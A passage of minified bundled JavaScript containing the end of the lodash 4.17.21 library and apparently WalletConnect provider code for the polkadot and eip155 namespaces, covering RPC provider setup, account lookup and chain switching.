o.placeholder=e.placeholder,o},Br.debounce=Rs,Br.defaults=xa,Br.defaultsDeep=Sa,Br.defer=Ts,Br.delay=Os,Br.difference=Uo,Br.differenceBy=$o,Br.differenceWith=zo,Br.drop=function(e,t,n){var i=null==e?0:e.length;return i?ri(e,(t=n||t===r?1:fa(t))<0?0:t,i):[]},Br.dropRight=function(e,t,n){var i=null==e?0:e.length;return i?ri(e,0,(t=i-(t=n||t===r?1:fa(t)))<0?0:t):[]},Br.dropRightWhile=function(e,t){return e&&e.length?di(e,ao(t,3),!0,!0):[]},Br.dropWhile=function(e,t){return e&&e.length?di(e,ao(t,3),!0):[]},Br.fill=function(e,t,n,i){var o=null==e?0:e.length;return o?(n&&"number"!=typeof n&&bo(e,t,n)&&(n=0,i=o),function(e,t,n,i){var o=e.length;for((n=fa(n))<0&&(n=-n>o?0:o+n),(i=i===r||i>o?o:fa(i))<0&&(i+=o),i=n>i?0:pa(i);n<i;)e[n++]=t;return e}(e,t,n,i)):[]},Br.filter=function(e,t){return(Hs(e)?Rt:gn)(e,ao(t,3))},Br.flatMap=function(e,t){return mn(Es(e,t),1)},Br.flatMapDeep=function(e,t){return mn(Es(e,t),h)},Br.flatMapDepth=function(e,t,n){return n=n===r?1:fa(n),mn(Es(e,t),n)},Br.flatten=qo,Br.flattenDeep=function(e){return(null==e?0:e.length)?mn(e,h):[]},Br.flattenDepth=function(e,t){return(null==e?0:e.length)?mn(e,t=t===r?1:fa(t)):[]},Br.flip=function(e){return Yi(e,512)},Br.flow=ec,Br.flowRight=tc,Br.fromPairs=function(e){for(var t=-1,r=null==e?0:e.length,n={};++t<r;){var i=e[t];n[i[0]]=i[1]}return n},Br.functions=function(e){return null==e?[]:_n(e,Ra(e))},Br.functionsIn=function(e){return null==e?[]:_n(e,Ta(e))},Br.groupBy=bs,Br.initial=function(e){return(null==e?0:e.length)?ri(e,0,-1):[]},Br.intersection=Vo,Br.intersectionBy=Go,Br.intersectionWith=Ko,Br.invert=Ia,Br.invertBy=ka,Br.invokeMap=ws,Br.iteratee=nc,Br.keyBy=_s,Br.keys=Ra,Br.keysIn=Ta,Br.map=Es,Br.mapKeys=function(e,t){var r={};return t=ao(t,3),bn(e,(function(e,n,i){nn(r,t(e,n,i),e)})),r},Br.mapValues=function(e,t){var r={};return t=ao(t,3),bn(e,(function(e,n,i){nn(r,n,t(e,n,i))})),r},Br.matches=function(e){return Un(an(e,1))},Br.matchesProperty=function(e,t){return $n(e,an(t,1))},Br.memoize=Ps,Br.merge=Oa,Br.mergeWith=Pa,Br.method=ic,Br.methodOf=oc,Br.mixin=sc,Br.negate=Ms,Br.nthArg=function(e){return e=fa(e),Zn((function(t){return Fn(t,e)}))},Br.omit=Ma,Br.omitBy=function(e,t){return La(e,Ms(ao(t)))},Br.once=function(e){return Is(2,e)},Br.orderBy=function(e,t,n,i){return null==e?[]:(Hs(t)||(t=null==t?[]:[t]),Hs(n=i?r:n)||(n=null==n?[]:[n]),Hn(e,t,n))},Br.over=cc,Br.overArgs=js,Br.overEvery=lc,Br.overSome=uc,Br.partial=Ls,Br.partialRight=Ds,Br.partition=xs,Br.pick=ja,Br.pickBy=La,Br.property=hc,Br.propertyOf=function(e){return function(t){return null==e?r:En(e,t)}},Br.pull=Yo,Br.pullAll=Jo,Br.pullAllBy=function(e,t,r){return e&&e.length&&t&&t.length?Wn(e,t,ao(r,2)):e},Br.pullAllWith=function(e,t,n){return e&&e.length&&t&&t.length?Wn(e,t,r,n):e},Br.pullAt=Qo,Br.range=dc,Br.rangeRight=fc,Br.rearg=Bs,Br.reject=function(e,t){return(Hs(e)?Rt:gn)(e,Ms(ao(t,3)))},Br.remove=function(e,t){var r=[];if(!e||!e.length)return r;var n=-1,i=[],o=e.length;for(t=ao(t,3);++n<o;){var s=e[n];t(s,n,e)&&(r.push(s),i.push(n))}return Vn(e,i),r},Br.rest=function(e,t){if("function"!=typeof e)throw new Ne(n);return Zn(e,t=t===r?t:fa(t))},Br.reverse=Xo,Br.sampleSize=function(e,t,n){return t=(n?bo(e,t,n):t===r)?1:fa(t),(Hs(e)?Yr:Jn)(e,t)},Br.set=function(e,t,r){return null==e?e:Qn(e,t,r)},Br.setWith=function(e,t,n,i){return i="function"==typeof i?i:r,null==e?e:Qn(e,t,n,i)},Br.shuffle=function(e){return(Hs(e)?Jr:ti)(e)},Br.slice=function(e,t,n){var i=null==e?0:e.length;return i?(n&&"number"!=typeof n&&bo(e,t,n)?(t=0,n=i):(t=null==t?0:fa(t),n=n===r?i:fa(n)),ri(e,t,n)):[]},Br.sortBy=Ss,Br.sortedUniq=function(e){return e&&e.length?si(e):[]},Br.sortedUniqBy=function(e,t){return e&&e.length?si(e,ao(t,2)):[]},Br.split=function(e,t,n){return n&&"number"!=typeof n&&bo(e,t,n)&&(t=n=r),(n=n===r?p:n>>>0)?(e=va(e))&&("string"==typeof t||null!=t&&!ia(t))&&(!(t=ci(t))&&or(e))?wi(hr(e),0,n):e.split(t,n):[]},Br.spread=function(e,t){if("function"!=typeof e)throw new Ne(n);return t=null==t?0:mr(fa(t),0),Zn((function(r){var n=r[t],i=wi(r,0,t);return n&&Mt(i,n),At(e,this,i)}))},Br.tail=function(e){var t=null==e?0:e.length;return t?ri(e,1,t):[]},Br.take=function(e,t,n){return e&&e.length?ri(e,0,(t=n||t===r?1:fa(t))<0?0:t):[]},Br.takeRight=function(e,t,n){var i=null==e?0:e.length;return i?ri(e,(t=i-(t=n||t===r?1:fa(t)))<0?0:t,i):[]},Br.takeRightWhile=function(e,t){return e&&e.length?di(e,ao(t,3),!1,!0):[]},Br.takeWhile=function(e,t){return e&&e.length?di(e,ao(t,3)):[]},Br.tap=function(e,t){return t(e),e},Br.throttle=function(e,t,r){var i=!0,o=!0;if("function"!=typeof e)throw new Ne(n);return Xs(r)&&(i="leading"in r?!!r.leading:i,o="trailing"in r?!!r.trailing:o),Rs(e,t,{leading:i,maxWait:t,trailing:o})},Br.thru=ds,Br.toArray=ha,Br.toPairs=Da,Br.toPairsIn=Ba,Br.toPath=function(e){return Hs(e)?Pt(e,Lo):aa(e)?[e]:ki(jo(va(e)))},Br.toPlainObject=ma,Br.transform=function(e,t,r){var n=Hs(e),i=n||Gs(e)||ca(e);if(t=ao(t,4),null==r){var o=e&&e.constructor;r=i?n?new o:[]:Xs(e)&&Ys(o)?Ur(Ve(e)):{}}return(i?It:bn)(e,(function(e,n,i){return t(r,e,n,i)})),r},Br.unary=function(e){return Cs(e,1)},Br.union=es,Br.unionBy=ts,Br.unionWith=rs,Br.uniq=function(e){return e&&e.length?li(e):[]},Br.uniqBy=function(e,t){return e&&e.length?li(e,ao(t,2)):[]},Br.uniqWith=function(e,t){return t="function"==typeof t?t:r,e&&e.length?li(e,r,t):[]},Br.unset=function(e,t){return null==e||ui(e,t)},Br.unzip=ns,Br.unzipWith=is,Br.update=function(e,t,r){return null==e?e:hi(e,t,vi(r))},Br.updateWith=function(e,t,n,i){return i="function"==typeof i?i:r,null==e?e:hi(e,t,vi(n),i)},Br.values=Ua,Br.valuesIn=function(e){return null==e?[]:Qt(e,Ta(e))},Br.without=os,Br.words=Ya,Br.wrap=function(e,t){return Ls(vi(t),e)},Br.xor=ss,Br.xorBy=as,Br.xorWith=cs,Br.zip=ls,Br.zipObject=function(e,t){return gi(e||[],t||[],Xr)},Br.zipObjectDeep=function(e,t){return gi(e||[],t||[],Qn)},Br.zipWith=us,Br.entries=Da,Br.entriesIn=Ba,Br.extend=ba,Br.extendWith=wa,sc(Br,Br),Br.add=mc,Br.attempt=Ja,Br.camelCase=$a,Br.capitalize=za,Br.ceil=vc,Br.clamp=function(e,t,n){return n===r&&(n=t,t=r),n!==r&&(n=(n=ga(n))==n?n:0),t!==r&&(t=(t=ga(t))==t?t:0),sn(ga(e),t,n)},Br.clone=function(e){return an(e,4)},Br.cloneDeep=function(e){return an(e,5)},Br.cloneDeepWith=function(e,t){return an(e,5,t="function"==typeof t?t:r)},Br.cloneWith=function(e,t){return an(e,4,t="function"==typeof t?t:r)},Br.conformsTo=function(e,t){return null==t||cn(e,t,Ra(t))},Br.deburr=Fa,Br.defaultTo=function(e,t){return null==e||e!=e?t:e},Br.divide=yc,Br.endsWith=function(e,t,n){e=va(e),t=ci(t);var i=e.length,o=n=n===r?i:sn(fa(n),0,i);return(n-=t.length)>=0&&e.slice(n,o)==t},Br.eq=Us,Br.escape=function(e){return(e=va(e))&&Z.test(e)?e.replace(G,nr):e},Br.escapeRegExp=function(e){return(e=va(e))&&ne.test(e)?e.replace(re,"\\$&"):e},Br.every=function(e,t,n){var i=Hs(e)?Nt:fn;return n&&bo(e,t,n)&&(t=r),i(e,ao(t,3))},Br.find=gs,Br.findIndex=Fo,Br.findKey=function(e,t){return Ut(e,ao(t,3),bn)},Br.findLast=ms,Br.findLastIndex=Ho,Br.findLastKey=function(e,t){return Ut(e,ao(t,3),wn)},Br.floor=bc,Br.forEach=vs,Br.forEachRight=ys,Br.forIn=function(e,t){return null==e?e:vn(e,ao(t,3),Ta)},Br.forInRight=function(e,t){return null==e?e:yn(e,ao(t,3),Ta)},Br.forOwn=function(e,t){return e&&bn(e,ao(t,3))},Br.forOwnRight=function(e,t){return e&&wn(e,ao(t,3))},Br.get=Aa,Br.gt=$s,Br.gte=zs,Br.has=function(e,t){return null!=e&&go(e,t,Cn)},Br.hasIn=Ca,Br.head=Wo,Br.identity=rc,Br.includes=function(e,t,r,n){e=Ws(e)?e:Ua(e),r=r&&!n?fa(r):0;var i=e.length;return r<0&&(r=mr(i+r,0)),sa(e)?r<=i&&e.indexOf(t,r)>-1:!!i&&zt(e,t,r)>-1},Br.indexOf=function(e,t,r){var n=null==e?0:e.length;if(!n)return-1;var i=null==r?0:fa(r);return i<0&&(i=mr(n+i,0)),zt(e,t,i)},Br.inRange=function(e,t,n){return t=da(t),n===r?(n=t,t=0):n=da(n),function(e,t,r){return e>=vr(t,r)&&e<mr(t,r)}(e=ga(e),t,n)},Br.invoke=Na,Br.isArguments=Fs,Br.isArray=Hs,Br.isArrayBuffer=qs,Br.isArrayLike=Ws,Br.isArrayLikeObject=Vs,Br.isBoolean=function(e){return!0===e||!1===e||ea(e)&&Sn(e)==y},Br.isBuffer=Gs,Br.isDate=Ks,Br.isElement=function(e){return ea(e)&&1===e.nodeType&&!na(e)},Br.isEmpty=function(e){if(null==e)return!0;if(Ws(e)&&(Hs(e)||"string"==typeof e||"function"==typeof e.splice||Gs(e)||ca(e)||Fs(e)))return!e.length;var t=po(e);if(t==x||t==k)return!e.size;if(xo(e))return!jn(e).length;for(var r in e)if(je.call(e,r))return!1;return!0},Br.isEqual=function(e,t){return Tn(e,t)},Br.isEqualWith=function(e,t,n){var i=(n="function"==typeof n?n:r)?n(e,t):r;return i===r?Tn(e,t,r,n):!!i},Br.isError=Zs,Br.isFinite=function(e){return"number"==typeof e&&Bt(e)},Br.isFunction=Ys,Br.isInteger=Js,Br.isLength=Qs,Br.isMap=ta,Br.isMatch=function(e,t){return e===t||On(e,t,lo(t))},Br.isMatchWith=function(e,t,n){return n="function"==typeof n?n:r,On(e,t,lo(t),n)},Br.isNaN=function(e){return ra(e)&&e!=+e},Br.isNative=function(e){if(Eo(e))throw new xe("Unsupported core-js use. Try https://npms.io/search?q=ponyfill.");return Pn(e)},Br.isNil=function(e){return null==e},Br.isNull=function(e){return null===e},Br.isNumber=ra,Br.isObject=Xs,Br.isObjectLike=ea,Br.isPlainObject=na,Br.isRegExp=ia,Br.isSafeInteger=function(e){return Js(e)&&e>=-d&&e<=d},Br.isSet=oa,Br.isString=sa,Br.isSymbol=aa,Br.isTypedArray=ca,Br.isUndefined=function(e){return e===r},Br.isWeakMap=function(e){return ea(e)&&po(e)==T},Br.isWeakSet=function(e){return ea(e)&&"[object WeakSet]"==Sn(e)},Br.join=function(e,t){return null==e?"":Vt.call(e,t)},Br.kebabCase=Ha,Br.last=Zo,Br.lastIndexOf=function(e,t,n){var i=null==e?0:e.length;if(!i)return-1;var o=i;return n!==r&&(o=(o=fa(n))<0?mr(i+o,0):vr(o,i-1)),t==t?function(e,t,r){for(var n=r+1;n--;)if(e[n]===t)return n;return n}(e,t,o):$t(e,Ht,o,!0)},Br.lowerCase=qa,Br.lowerFirst=Wa,Br.lt=la,Br.lte=ua,Br.max=function(e){return e&&e.length?pn(e,rc,An):r},Br.maxBy=function(e,t){return e&&e.length?pn(e,ao(t,2),An):r},Br.mean=function(e){return qt(e,rc)},Br.meanBy=function(e,t){return qt(e,ao(t,2))},Br.min=function(e){return e&&e.length?pn(e,rc,Dn):r},Br.minBy=function(e,t){return e&&e.length?pn(e,ao(t,2),Dn):r},Br.stubArray=pc,Br.stubFalse=gc,Br.stubObject=function(){return{}},Br.stubString=function(){return""},Br.stubTrue=function(){return!0},Br.multiply=wc,Br.nth=function(e,t){return e&&e.length?Fn(e,fa(t)):r},Br.noConflict=function(){return ft._===this&&(ft._=$e),this},Br.noop=ac,Br.now=As,Br.pad=function(e,t,r){e=va(e);var n=(t=fa(t))?ur(e):0;if(!t||n>=t)return e;var i=(t-n)/2;return Hi(gt(i),r)+e+Hi(pt(i),r)},Br.padEnd=function(e,t,r){e=va(e);var n=(t=fa(t))?ur(e):0;return t&&n<t?e+Hi(t-n,r):e},Br.padStart=function(e,t,r){e=va(e);var n=(t=fa(t))?ur(e):0;return t&&n<t?Hi(t-n,r)+e:e},Br.parseInt=function(e,t,r){return r||null==t?t=0:t&&(t=+t),br(va(e).replace(ie,""),t||0)},Br.random=function(e,t,n){if(n&&"boolean"!=typeof n&&bo(e,t,n)&&(t=n=r),n===r&&("boolean"==typeof t?(n=t,t=r):"boolean"==typeof e&&(n=e,e=r)),e===r&&t===r?(e=0,t=1):(e=da(e),t===r?(t=e,e=0):t=da(t)),e>t){var i=e;e=t,t=i}if(n||e%1||t%1){var o=wr();return vr(e+o*(t-e+lt("1e-"+((o+"").length-1))),t)}return Gn(e,t)},Br.reduce=function(e,t,r){var n=Hs(e)?jt:Gt,i=arguments.length<3;return n(e,ao(t,4),r,i,hn)},Br.reduceRight=function(e,t,r){var n=Hs(e)?Lt:Gt,i=arguments.length<3;return n(e,ao(t,4),r,i,dn)},Br.repeat=function(e,t,n){return t=(n?bo(e,t,n):t===r)?1:fa(t),Kn(va(e),t)},Br.replace=function(){var e=arguments,t=va(e[0]);return e.length<3?t:t.replace(e[1],e[2])},Br.result=function(e,t,n){var i=-1,o=(t=yi(t,e)).length;for(o||(o=1,e=r);++i<o;){var s=null==e?r:e[Lo(t[i])];s===r&&(i=o,s=n),e=Ys(s)?s.call(e):s}return e},Br.round=_c,Br.runInContext=e,Br.sample=function(e){return(Hs(e)?Zr:Yn)(e)},Br.size=function(e){if(null==e)return 0;if(Ws(e))return sa(e)?ur(e):e.length;var t=po(e);return t==x||t==k?e.size:jn(e).length},Br.snakeCase=Va,Br.some=function(e,t,n){var i=Hs(e)?Dt:ni;return n&&bo(e,t,n)&&(t=r),i(e,ao(t,3))},Br.sortedIndex=function(e,t){return ii(e,t)},Br.sortedIndexBy=function(e,t,r){return oi(e,t,ao(r,2))},Br.sortedIndexOf=function(e,t){var r=null==e?0:e.length;if(r){var n=ii(e,t);if(n<r&&Us(e[n],t))return n}return-1},Br.sortedLastIndex=function(e,t){return ii(e,t,!0)},Br.sortedLastIndexBy=function(e,t,r){return oi(e,t,ao(r,2),!0)},Br.sortedLastIndexOf=function(e,t){if(null==e?0:e.length){var r=ii(e,t,!0)-1;if(Us(e[r],t))return r}return-1},Br.startCase=Ga,Br.startsWith=function(e,t,r){return e=va(e),r=null==r?0:sn(fa(r),0,e.length),t=ci(t),e.slice(r,r+t.length)==t},Br.subtract=Ec,Br.sum=function(e){return e&&e.length?Kt(e,rc):0},Br.sumBy=function(e,t){return e&&e.length?Kt(e,ao(t,2)):0},Br.template=function(e,t,n){var i=Br.templateSettings;n&&bo(e,t,n)&&(t=r),e=va(e),t=wa({},t,i,Ji);var o,s,a=wa({},t.imports,i.imports,Ji),c=Ra(a),l=Qt(a,c),u=0,h=t.interpolate||we,d="__p += '",f=Ie((t.escape||we).source+"|"+h.source+"|"+(h===Q?de:we).source+"|"+(t.evaluate||we).source+"|$","g"),p="//# sourceURL="+(je.call(t,"sourceURL")?(t.sourceURL+"").replace(/\s/g," "):"lodash.templateSources["+ ++ot+"]")+"\n";e.replace(f,(function(t,r,n,i,a,c){return n||(n=i),d+=e.slice(u,c).replace(_e,ir),r&&(o=!0,d+="' +\n__e("+r+") +\n'"),a&&(s=!0,d+="';\n"+a+";\n__p += '"),n&&(d+="' +\n((__t = ("+n+")) == null ? '' : __t) +\n'"),u=c+t.length,t})),d+="';\n";var g=je.call(t,"variable")&&t.variable;if(g){if(ue.test(g))throw new xe("Invalid `variable` option passed into `_.template`")}else d="with (obj) {\n"+d+"\n}\n";d=(s?d.replace(H,""):d).replace(q,"$1").replace(W,"$1;"),d="function("+(g||"obj")+") {\n"+(g?"":"obj || (obj = {});\n")+"var __t, __p = ''"+(o?", __e = _.escape":"")+(s?", __j = Array.prototype.join;\nfunction print() { __p += __j.call(arguments, '') }\n":";\n")+d+"return __p\n}";var m=Ja((function(){return Se(c,p+"return "+d).apply(r,l)}));if(m.source=d,Zs(m))throw m;return m},Br.times=function(e,t){if((e=fa(e))<1||e>d)return[];var r=p,n=vr(e,p);t=ao(t),e-=p;for(var i=Zt(n,t);++r<e;)t(r);return i},Br.toFinite=da,Br.toInteger=fa,Br.toLength=pa,Br.toLower=function(e){return va(e).toLowerCase()},Br.toNumber=ga,Br.toSafeInteger=function(e){return e?sn(fa(e),-d,d):0===e?e:0},Br.toString=va,Br.toUpper=function(e){return va(e).toUpperCase()},Br.trim=function(e,t,n){if((e=va(e))&&(n||t===r))return Yt(e);if(!e||!(t=ci(t)))return e;var i=hr(e),o=hr(t);return wi(i,er(i,o),tr(i,o)+1).join("")},Br.trimEnd=function(e,t,n){if((e=va(e))&&(n||t===r))return e.slice(0,dr(e)+1);if(!e||!(t=ci(t)))return e;var i=hr(e);return wi(i,0,tr(i,hr(t))+1).join("")},Br.trimStart=function(e,t,n){if((e=va(e))&&(n||t===r))return e.replace(ie,"");if(!e||!(t=ci(t)))return e;var i=hr(e);return wi(i,er(i,hr(t))).join("")},Br.truncate=function(e,t){var n=30,i="...";if(Xs(t)){var o="separator"in t?t.separator:o;n="length"in t?fa(t.length):n,i="omission"in t?ci(t.omission):i}var s=(e=va(e)).length;if(or(e)){var a=hr(e);s=a.length}if(n>=s)return e;var c=n-ur(i);if(c<1)return i;var l=a?wi(a,0,c).join(""):e.slice(0,c);if(o===r)return l+i;if(a&&(c+=l.length-c),ia(o)){if(e.slice(c).search(o)){var u,h=l;for(o.global||(o=Ie(o.source,va(fe.exec(o))+"g")),o.lastIndex=0;u=o.exec(h);)var d=u.index;l=l.slice(0,d===r?c:d)}}else if(e.indexOf(ci(o),c)!=c){var f=l.lastIndexOf(o);f>-1&&(l=l.slice(0,f))}return l+i},Br.unescape=function(e){return(e=va(e))&&K.test(e)?e.replace(V,fr):e},Br.uniqueId=function(e){var t=++Le;return va(e)+t},Br.upperCase=Ka,Br.upperFirst=Za,Br.each=vs,Br.eachRight=ys,Br.first=Wo,sc(Br,function(){var e={};return bn(Br,(function(t,r){je.call(Br.prototype,r)||(e[r]=t)})),e}(),{chain:!1}),Br.VERSION="4.17.21",It(["bind","bindKey","curry","curryRight","partial","partialRight"],(function(e){Br[e].placeholder=Br})),It(["drop","take"],(function(e,t){Fr.prototype[e]=function(n){n=n===r?1:mr(fa(n),0);var i=this.__filtered__&&!t?new Fr(this):this.clone();return i.__filtered__?i.__takeCount__=vr(n,i.__takeCount__):i.__views__.push({size:vr(n,p),type:e+(i.__dir__<0?"Right":"")}),i},Fr.prototype[e+"Right"]=function(t){return this.reverse()[e](t).reverse()}})),It(["filter","map","takeWhile"],(function(e,t){var r=t+1,n=1==r||3==r;Fr.prototype[e]=function(e){var t=this.clone();return t.__iteratees__.push({iteratee:ao(e,3),type:r}),t.__filtered__=t.__filtered__||n,t}})),It(["head","last"],(function(e,t){var r="take"+(t?"Right":"");Fr.prototype[e]=function(){return this[r](1).value()[0]}})),It(["initial","tail"],(function(e,t){var r="drop"+(t?"":"Right");Fr.prototype[e]=function(){return this.__filtered__?new Fr(this):this[r](1)}})),Fr.prototype.compact=function(){return this.filter(rc)},Fr.prototype.find=function(e){return this.filter(e).head()},Fr.prototype.findLast=function(e){return this.reverse().find(e)},Fr.prototype.invokeMap=Zn((function(e,t){return"function"==typeof e?new Fr(this):this.map((function(r){return Nn(r,e,t)}))})),Fr.prototype.reject=function(e){return this.filter(Ms(ao(e)))},Fr.prototype.slice=function(e,t){e=fa(e);var n=this;return n.__filtered__&&(e>0||t<0)?new Fr(n):(e<0?n=n.takeRight(-e):e&&(n=n.drop(e)),t!==r&&(n=(t=fa(t))<0?n.dropRight(-t):n.take(t-e)),n)},Fr.prototype.takeRightWhile=function(e){return this.reverse().takeWhile(e).reverse()},Fr.prototype.toArray=function(){return this.take(p)},bn(Fr.prototype,(function(e,t){var n=/^(?:filter|find|map|reject)|While$/.test(t),i=/^(?:head|last)$/.test(t),o=Br[i?"take"+("last"==t?"Right":""):t],s=i||/^find/.test(t);o&&(Br.prototype[t]=function(){var t=this.__wrapped__,a=i?[1]:arguments,c=t instanceof Fr,l=a[0],u=c||Hs(t),h=function(e){var t=o.apply(Br,Mt([e],a));return i&&d?t[0]:t};u&&n&&"function"==typeof l&&1!=l.length&&(c=u=!1);var d=this.__chain__,f=!!this.__actions__.length,p=s&&!d,g=c&&!f;if(!s&&u){t=g?t:new Fr(this);var m=e.apply(t,a);return m.__actions__.push({func:ds,args:[h],thisArg:r}),new zr(m,d)}return p&&g?e.apply(this,a):(m=this.thru(h),p?i?m.value()[0]:m.value():m)})})),It(["pop","push","shift","sort","splice","unshift"],(function(e){var t=Re[e],r=/^(?:push|sort|unshift)$/.test(e)?"tap":"thru",n=/^(?:pop|shift)$/.test(e);Br.prototype[e]=function(){var e=arguments;if(n&&!this.__chain__){var i=this.value();return t.apply(Hs(i)?i:[],e)}return this[r]((function(r){return t.apply(Hs(r)?r:[],e)}))}})),bn(Fr.prototype,(function(e,t){var r=Br[t];if(r){var n=r.name+"";je.call(Nr,n)||(Nr[n]=[]),Nr[n].push({name:t,func:r})}})),Nr[Ui(r,2).name]=[{name:"wrapper",func:r}],Fr.prototype.clone=function(){var e=new Fr(this.__wrapped__);return e.__actions__=ki(this.__actions__),e.__dir__=this.__dir__,e.__filtered__=this.__filtered__,e.__iteratees__=ki(this.__iteratees__),e.__takeCount__=this.__takeCount__,e.__views__=ki(this.__views__),e},Fr.prototype.reverse=function(){if(this.__filtered__){var e=new Fr(this);e.__dir__=-1,e.__filtered__=!0}else(e=this.clone()).__dir__*=-1;return e},Fr.prototype.value=function(){var e=this.__wrapped__.value(),t=this.__dir__,r=Hs(e),n=t<0,i=r?e.length:0,o=function(e,t,r){for(var n=-1,i=r.length;++n<i;){var o=r[n],s=o.size;switch(o.type){case"drop":e+=s;break;case"dropRight":t-=s;break;case"take":t=vr(t,e+s);break;case"takeRight":e=mr(e,t-s)}}return{start:e,end:t}}(0,i,this.__views__),s=o.start,a=o.end,c=a-s,l=n?a:s-1,u=this.__iteratees__,h=u.length,d=0,f=vr(c,this.__takeCount__);if(!r||!n&&i==c&&f==c)return fi(e,this.__actions__);var p=[];e:for(;c--&&d<f;){for(var g=-1,m=e[l+=t];++g<h;){var v=u[g],y=v.iteratee,b=v.type,w=y(m);if(2==b)m=w;else if(!w){if(1==b)continue e;break e}}p[d++]=m}return p},Br.prototype.at=fs,Br.prototype.chain=function(){return hs(this)},Br.prototype.commit=function(){return new zr(this.value(),this.__chain__)},Br.prototype.next=function(){this.__values__===r&&(this.__values__=ha(this.value()));var e=this.__index__>=this.__values__.length;return{done:e,value:e?r:this.__values__[this.__index__++]}},Br.prototype.plant=function(e){for(var t,n=this;n instanceof $r;){var i=Bo(n);i.__index__=0,i.__values__=r,t?o.__wrapped__=i:t=i;var o=i;n=n.__wrapped__}return o.__wrapped__=e,t},Br.prototype.reverse=function(){var e=this.__wrapped__;if(e instanceof Fr){var t=e;return this.__actions__.length&&(t=new Fr(this)),(t=t.reverse()).__actions__.push({func:ds,args:[Xo],thisArg:r}),new zr(t,this.__chain__)}return this.thru(Xo)},Br.prototype.toJSON=Br.prototype.valueOf=Br.prototype.value=function(){return fi(this.__wrapped__,this.__actions__)},Br.prototype.first=Br.prototype.head,Je&&(Br.prototype[Je]=function(){return this}),Br}();gt?((gt.exports=pr)._=pr,pt._=pr):ft._=pr}).call(sd)}(O2,O2.exports);var CQ=Object.defineProperty,AQ=Object.defineProperties,IQ=Object.getOwnPropertyDescriptors,Gx=Object.getOwnPropertySymbols,RQ=Object.prototype.hasOwnProperty,TQ=Object.prototype.propertyIsEnumerable,Kx=(e,t,r)=>t in e?CQ(e,t,{enumerable:!0,configurable:!0,writable:!0,value:r}):e[t]=r,x1=(e,t)=>{for(var r in t||(t={}))RQ.call(t,r)&&Kx(e,r,t[r]);if(Gx)for(var r of Gx(t))TQ.call(t,r)&&Kx(e,r,t[r]);return e},NQ=(e,t)=>AQ(e,IQ(t));function $c(e,t,r){var n;const i=$q(e);return(null==(n=t.rpcMap)?void 0:n[i.reference])||`${SQ}?chainId=${i.namespace}:${i.reference}&projectId=${r}`}function uu(e){return e.includes(":")?e.split(":")[1]:e}function jI(e){return e.map((e=>`${e.split(":")[0]}:${e.split(":")[1]}`))}function OQ(e,t){const r=Object.keys(t.namespaces).filter((t=>t.includes(e)));if(!r.length)return[];const n=[];return r.forEach((e=>{const r=t.namespaces[e].accounts;n.push(...r)})),n}function PQ(e={},t={}){const r=Jx(e),n=Jx(t);return O2.exports.merge(r,n)}function Jx(e){var t,r,n,i;const o={};if(!cf(e))return o;for(const[s,a]of Object.entries(e)){const e=Q3(s)?[s]:a.chains,c=a.methods||[],l=a.events||[],u=a.rpcMap||{},h=yd(s);o[h]=NQ(x1(x1({},o[h]),a),{chains:Aw(e,null==(t=o[h])?void 0:t.chains),methods:Aw(c,null==(r=o[h])?void 0:r.methods),events:Aw(l,null==(n=o[h])?void 0:n.events),rpcMap:x1(x1({},u),null==(i=o[h])?void 0:i.rpcMap)})}return o}function MQ(e){return e.includes(":")?e.split(":")[2]:e}function kQ(e){const t={};for(const[r,n]of Object.entries(e)){const e=n.methods||[],i=n.events||[],o=n.accounts||[],s=Q3(r)?[r]:n.chains?n.chains:jI(n.accounts);t[r]={chains:s,methods:e,events:i,accounts:o}}return t}function Fw(e){return"number"==typeof e?e:e.includes("0x")?parseInt(e,16):e.includes(":")?Number(e.split(":")[1]):Number(e)}const UI={},jr=e=>UI[e],jw=(e,t)=>{UI[e]=t};class DQ{constructor(e){this.name="polkadot",this.namespace=e.namespace,this.events=jr("events"),this.client=jr("client"),this.chainId=this.getDefaultChain(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider().request(e.request)}setDefaultChain(e,t){this.httpProviders[e]||this.setHttpProvider(e,t),this.chainId=e,this.events.emit(Ja.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}getAccounts(){const e=this.namespace.accounts;return e&&e.filter((e=>e.split(":")[1]===this.chainId.toString())).map((e=>e.split(":")[2]))||[]}createHttpProviders(){const e={};return this.namespace.chains.forEach((t=>{var r;const n=uu(t);e[n]=this.createHttpProvider(n,null==(r=this.namespace.rpcMap)?void 0:r[t])})),e}getHttpProvider(){const e=`${this.name}:${this.chainId}`,t=this.httpProviders[e];if(typeof t>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return t}setHttpProvider(e,t){const r=this.createHttpProvider(e,t);r&&(this.httpProviders[e]=r)}createHttpProvider(e,t){const r=t||$c(e,this.namespace,this.client.core.projectId);if(!r)throw new Error(`No RPC url provided for chainId: ${e}`);return new Ka(new Kc(r,jr("disableProviderPing")))}}class $Q{constructor(e){this.name="eip155",this.namespace=e.namespace,this.events=jr("events"),this.client=jr("client"),this.httpProviders=this.createHttpProviders(),this.chainId=parseInt(this.getDefaultChain())}async request(e){switch(e.request.method){case"eth_requestAccounts":case"eth_accounts":return this.getAccounts();case"wallet_switchEthereumChain":return await this.handleSwitchChain(e);case"eth_chainId":return parseInt(this.getDefaultChain())}return this.namespace.methods.includes(e.request.method)?await this.client.request(e):this.getHttpProvider().request(e.request)}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}setDefaultChain(e,t){this.httpProviders[e]||this.setHttpProvider(parseInt(e),t),this.chainId=parseInt(e),this.events.emit(Ja.DEFAULT_CHAIN_CHANGED,`${this.name}:${e}`)}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId.toString();if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}createHttpProvider(e,t){const r=t||$c(`${this.name}:${e}`,this.namespace,this.client.core.projectId);if(!r)throw new Error(`No RPC url provided for chainId: ${e}`);return new Ka(new Kc(r,jr("disableProviderPing")))}setHttpProvider(e,t){const r=this.createHttpProvider(e,t);r&&(this.httpProviders[e]=r)}createHttpProviders(){const e={};return this.namespace.chains.forEach((t=>{var r;const n=parseInt(uu(t));e[n]=this.createHttpProvider(n,null==(r=this.namespace.rpcMap)?void 0:r[t])})),e}getAccounts(){const 